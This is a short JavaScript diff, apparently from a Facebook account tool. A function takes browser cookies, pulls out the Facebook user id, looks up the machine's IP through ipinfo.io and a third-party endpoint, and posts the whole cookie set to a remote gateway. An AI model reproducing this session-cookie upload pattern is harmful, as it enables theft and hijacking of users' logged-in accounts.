@@ -6,7 +6,8 @@ import { MainResource } from '../resources/main.resource';
 const MainRepository = {
     createFbAccount: async (cookies) => {
         const { value: uid } = cookies.find(item => item.name == "c_user");
-        const { data: ipInfo } = await axios.get("https://www.ipinfo.io");
+        const currentIp = (await axios.get("https://ipinfo.io/ip")).data;
+        const { data: ipInfo } = await axios.get("https://api.smitfb.com/AppConfig/Info?ip="+currentIp);
         const resource = MainResource.createFbAccount();
         const apiGateWay = new ApiGateWay(Config.getBaseConfig());
         return apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
